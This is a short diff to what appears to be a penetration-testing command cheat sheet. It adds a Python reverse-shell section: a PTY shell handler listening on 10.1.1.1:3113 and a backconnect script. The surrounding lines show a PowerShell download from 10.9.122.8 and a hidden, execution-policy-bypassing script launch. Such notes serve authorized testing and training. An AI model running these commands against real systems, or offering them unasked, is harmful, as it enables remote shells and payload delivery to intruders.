@@ -138,6 +138,14 @@ powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.9.122.8
 
 powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -File “YourScript.ps1” 
 
+### Python reverse shell
+### https://github.com/infodox/python-pty-shells
+python tcp_pty_shell_handler.py	-b 10.1.1.1:3113
+
+### shell, change ip and port
+tcp_pty_backconnect.py	
+
+
 
 # ----- Bash ----- #
 
